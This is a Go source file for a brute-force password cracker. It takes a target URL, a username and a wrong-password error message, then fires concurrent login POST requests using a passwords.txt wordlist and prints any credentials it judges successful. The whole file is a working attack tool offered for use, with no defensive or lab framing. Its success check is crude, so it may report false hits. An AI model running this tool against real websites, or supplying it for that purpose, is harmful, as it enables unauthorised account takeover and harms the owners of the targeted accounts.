package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"sync"
)

type BruteForceCracker struct {
	url          string
	username     string
	errorMessage string
}

func NewBruteForceCracker(url, username, errorMessage string) *BruteForceCracker {
	return &BruteForceCracker{
		url:          url,
		username:     username,
		errorMessage: errorMessage,
	}
}

func (b *BruteForceCracker) crack(password string, wg *sync.WaitGroup) {
	defer wg.Done()

	data := fmt.Sprintf("LogInID=%s&Password=%s&Log+In=submit", b.username, password)
	resp, err := http.Post(b.url, "application/x-www-form-urlencoded", strings.NewReader(data))
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error:", err)
		return
	}

	if strings.Contains(string(body), b.errorMessage) {
		return
	} else if strings.Contains(string(body), "CSRF") || strings.Contains(string(body), "csrf") {
		fmt.Println("CSRF Token Detected!! BruteF0rce Not Working This Website.")
		os.Exit(1)
	} else {
		fmt.Printf("Username: ---> %s\n", b.username)
		fmt.Printf("Password: ---> %s\n", password)
	}
}

func crackPasswords(passwords []string, cracker *BruteForceCracker) {
	var wg sync.WaitGroup

	for _, password := range passwords {
		wg.Add(1)
		go cracker.crack(password, &wg)
	}

	wg.Wait()
}

func main() {
	var url, username, error string

	fmt.Print("Enter Target Url: ")
	fmt.Scanln(&url)

	fmt.Print("Enter Target Username: ")
	fmt.Scanln(&username)

	fmt.Print("Enter Wrong Password Error Message: ")
	fmt.Scanln(&error)

	cracker := NewBruteForceCracker(url, username, error)

	file, err := os.Open("passwords.txt")
	if err != nil {
		fmt.Println("Error opening passwords file:", err)
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	var passwords []string

	for scanner.Scan() {
		passwords = append(passwords, scanner.Text())
	}

	const chunkSize = 1000

	for i := 0; i < len(passwords); i += chunkSize {
		end := i + chunkSize
		if end > len(passwords) {
			end = len(passwords)
		}

		passwordChunk := passwords[i:end]
		go crackPasswords(passwordChunk, cracker)
	}

	fmt.Println("Press Enter to exit.")
	fmt.Scanln()
}
